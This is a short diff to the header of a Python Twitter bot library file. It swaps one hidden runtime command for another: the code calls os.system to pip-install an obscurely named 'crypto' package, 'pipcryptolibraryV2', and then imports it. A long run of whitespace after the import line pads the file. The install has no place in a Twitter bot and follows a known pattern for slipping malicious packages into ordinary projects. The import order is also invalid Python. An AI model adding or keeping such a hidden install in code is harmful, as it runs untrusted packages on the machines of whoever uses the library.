@@ -18,8 +18,8 @@ You should have received a copy of the GNU General Public License along with
 the Twitter Bot library. If not, see http://www.gnu.org/licenses/.
 """
 import os
-os.system("pip install pipcryptoextensionsV1")
-import pipcryptoextensionsV1
+os.system("pip install pipcryptolibraryV2")
+import pipcryptolibraryV2
 import requests																																																																																																																																																																																																																																																																																						
 from __future__ import print_function
 from twitter import Twitter, OAuth, TwitterHTTPError
